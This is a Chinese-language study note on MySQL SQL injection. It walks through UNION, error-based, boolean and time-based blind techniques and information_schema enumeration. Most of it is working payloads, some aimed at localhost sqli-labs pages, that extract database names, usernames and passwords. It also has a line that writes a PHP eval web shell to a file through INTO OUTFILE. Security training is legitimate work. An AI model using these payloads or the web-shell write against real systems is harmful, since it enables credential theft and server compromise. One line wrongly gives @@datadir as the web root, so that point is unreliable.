# sql注入
	通过传入特定的参数，打破原有的sql语句结构
# sql注入上传文件,把select后面的结果保存到文件
```
	select "",<?php eval($_REQUEST[666])?>  into outfile "d:/1.txt"   
```
# 注入步骤
## 	1.探测注入点
		and 1=1    或    and 1=2     如果结果一样就是没执行
		' 或 "    '如果报错，说明有注入点
##	2.确定注入点是否真的存在
		 and 1=1  或 and 1=2  如果1=1有结果，1=2没有结果就证明注入点存在
			 '' LIMIT 0,1'，去掉两边的单引号，
## 3.注入手法
### 联合查询
### 优点，简单，速度快
### 缺点，必须要有回显。
union 用来连接多个查询语句，要求查询语句的字段数一样
1.探测注入点
2.确定sql语句有多少字段
```
order by 1   按照第一个字段排序，成功就最少有一个字段
order by 5   按照第5个字段排序，成功就最少有5个字段，出错就说明没有第五个字段
select 1，2
```   
### 3.调数据
```
当前数据库名  select database();  
当前登录用户	select user();    或者  select current_user();
数据库安装路径     select  @@baseDir;
数据库路径	   select  @@datadir
数据库版本	   select  @@version;
web主目录	   select  @@dataDir；  
5.0以上版本的mysql有information_schema 数据库，里面有整个mysql的所有信息
schemata表的schema_name字段有mysql中所有数据库的名
concat（1，2，3） 把1，2，3拼接到一块，如果1，2，3是字段就把字段拼接到一块
group_concat(字段名)    把查询的数据拼接成一行。
substr（字符串，开始位置，个数）字符串截取函数，从第几个开始，截取几个
```

### 查当前数据库服务器所有数据库
```									
union select schema_name from information_schema.schemata limit 0,1 --  //limit 是从第几条开始，显示几条，LIMIT 5,10; //检索记录行6-15
```
### 查表
```
union select table_name from information_schema.tables where table_schema ='库名' --
```
### 查字段
```
union select column_name from information_schema.columns where table_schema='库名' and table_name='表名' --
```
## 报错注入
### 优点，不需要回显
### 缺点，需要有报错信息，指的是数据库报错信息，速度较快
floor(4.5)   结果4，进一
```
http://localhost/php/2.php?id=3 and(select 1 from(select count(*),
concat((select (select (select concat(0x7e,user(),0x7e)))
from information_schema.tables limit 0,1),floor(rand(0)*2))
x from information_schema.tables group by x)a)  #暴用户名；
http://localhost/sqli/Less-5/?id=1' and (select 1 from (select count(*),
concat((select concat(username,password) from security.users limit 0,1),
floor(rand(0)*2))x from information_schema.tables group by x)a) --+ 爆数据
payload		and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x frominformation_schema.tables group by x)a)
payload		and extractvalue(1, payload)  注：输出字符有长度限制，最长32位and extractvalue(1, concat(0x7e,@@version,0x7e))
http://localhost/php/2.php?id=1 and extractvalue(1,concat(0x7e,(select database()),0x7e)) #暴数据库
http://localhost/sqli/Less-5/?id=1%27%20and%20extractvalue(1,concat(0x7e,(select%20concat(username,0x7e,password)%20from%20security.users%20limit%200,1),0x7e))%20--+   爆数据
payload		and updatexml(1,payload,1)  注：输出字符有长度限制，最长32位
and updatexml(1,concat(0x7e,@@version,0x7e),1)
and updatexml(1,concat(0x7e,(select @@version),0x7e),1)%20--+
```


## 布尔注入
### 优点，不需要回显
### 缺点，速度慢,需要查询语句有正常执行和不正常执行
```
length（"123456"）  结果6
ord （）= ascii（）  ASCII码
```			
确定数据库名称长度是否大于5
```
length（database()）>5 --
```
取数据库第一个字符的ascII码,是不是大于80
```
ascII(substr(database(),1,1))>80
```
## 延时 ,靠数据返回的时间判断数据是否正确
### 优点：不需要显示位，不需要报错信息，不需要查询正常不正常返回不一样
### 缺点：速度太慢，受网络波动影响较大
```
		   select sleep（5）   一条数据5秒之后显示查询结果
		   if（a,b,c）		a执行成功执行b,不成功执行c
```
```
 http://localhost/sqli/Less-10/?id=1" and if(ascii(substr(database(), 1, 1))>104, sleep(5), 1) --%20  爆库
```


# 总结：
	注入参数位置：任何可以由客户端控制的传递给服务端的参数都有可能发生sql注入
```
select
updata
delete
insert
```
sql注入   数据拖库 控制服务器
information_schema   元数据数据库
## 所有的库名	SCHEMATA
```
SHCEMA_NAME字段所有的数据库名
```
## 所有的表名	tables
```
table_schema当前表所属库的名字
table_name 当前表名
```
## 所有的字段名	columns
```
table_schema 字段所属的库名
table_name 字段所属的表名
column_name字段名				
```
## 查看数据库配置文件的secure_file_priv的属性值，为空则可以写入文件,需要php.ini 中display_errors=On开启PHP错误回显,显示报错信息
```
show variables like '%secure_file_priv'
```   
